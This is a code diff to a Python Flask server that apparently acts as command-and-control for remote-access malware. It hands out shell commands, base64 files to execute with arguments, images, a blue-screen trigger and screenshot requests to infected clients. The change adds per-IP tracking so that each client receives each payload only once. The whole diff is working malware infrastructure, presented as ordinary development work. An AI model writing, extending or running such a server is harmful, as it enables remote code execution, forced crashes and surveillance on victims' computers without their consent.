@@ -8,11 +8,19 @@ from time import sleep
 
 app = Flask(__name__)
 limiter = Limiter(get_remote_address, app=app)
+
 command: str = ""
+command_ips: list[str] = []
+
 image: bytes = b""
+image_ips: list[str] = []
+
 bsod_activated: bool = False
+
 runfile: bytes = b""
 runfile_args: str = ""
+runfile_ips: list[str] = []
+
 screenshot_urls: list[bytes] = []
 take_screenshot: bool = False
 screenshot_ips: list[str] = []
@@ -45,7 +53,12 @@ def runfile_center() -> Response:
     if len(runfile) == 0:
         return Response("no files to execute", 204)
     else:
-        return {"runfile": b64encode(runfile).decode(), "args": runfile_args}
+        remote_ip = get_remote_address()
+        if remote_ip in runfile_ips:
+            return Response("u cant do that rn", 400)
+        else:
+            runfile_ips.append(remote_ip)
+            return {"runfile": b64encode(runfile).decode(), "args": runfile_args}
 
 
 @app.route("/command-center", methods=["GET"])
@@ -54,7 +67,12 @@ def command_center() -> Response:
     if len(command) == 0:
         return Response("no commands to execute", 204)
     else:
-        return Response(command, 200)
+        remote_ip = get_remote_address()
+        if remote_ip in command_ips:
+            return Response("u cant do that rn", 400)
+        else:
+            command_ips.append(remote_ip)
+            return Response(command, 200)
 
 
 @app.route("/image-center", methods=["GET"])
@@ -63,7 +81,12 @@ def image_center() -> Response:
     if len(image) == 0:
         return Response("no images to show", 204)
     else:
-        return image
+        remote_ip = get_remote_address()
+        if remote_ip in image_ips:
+            return Response("u cant do that rn", 400)
+        else:
+            image_ips.append(remote_ip)
+            return image
 
 
 @app.route("/bsod-center", methods=["GET"])
